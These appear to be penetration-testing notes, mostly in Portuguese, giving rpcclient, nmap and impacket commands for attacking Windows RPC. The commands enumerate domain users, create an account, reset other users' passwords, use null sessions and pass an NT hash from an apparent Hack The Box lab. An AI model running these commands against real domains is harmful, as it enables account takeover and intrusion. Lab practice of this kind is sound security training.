RPC
========================
RPC 139/445

    srvinfo
    querydominfo
    
    enumdomusers
    
    queryusergroups
    
    enumdomgroups

## Criar usuario via RPC

    createdomuser hacker

## Alterar senha de usuário

    setuserinfo2 hacker 24 Password@1
    #  a opção 23 acaba sendo mais interessante para manter as coisas mais simples
    setuserinfo audit2020 23 P@ssword!

    enumdomusers

RPC (111/tcp, 135/tcp)
msrpc/rpcbind


Version detection + NSE scripts

    nmap -Pn -sV -p $port --script=banner,msrpc-enum,rpc-grind,rpcinfo -oN tcp_port_rpc_nmap.txt <hostname>  

impacket

    impacket-rpcmap -brute-uuids -brute-opnums ncacn_ip_tcp:<hostname>
    
 
    impacket-rpcdump <hostname>


rpcinfo

List all registered RPC programs

    rpcinfo -p <hostname>    

Provide compact results

    rpcinfo -s <hostname>

Null session

    rpcclient -U "" -N <hostname>
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
 
## Pass the hash


Tem uma forma de realizar o pass the hash via rpcclient. Considere o comando:

    rpcclient --pw-nt-hash -U domain/user <hostname>
    
Ex.

    rpcclient --pw-nt-hash -U htb.local/henry.vinson apt.htb.local
    Password for [HTB.LOCAL\henry.vinson]: 

Aqui é necessário informar o nt hash do usuário!!! Assim funcionará corretamente o pass the hash.

Outra opção seria:

    pth-rpcclient -U htb.local/henry.vinson%00000000000000000000000000000000:e53d87d42adaa3ca32bdb34a876cbffb //apt.htb.local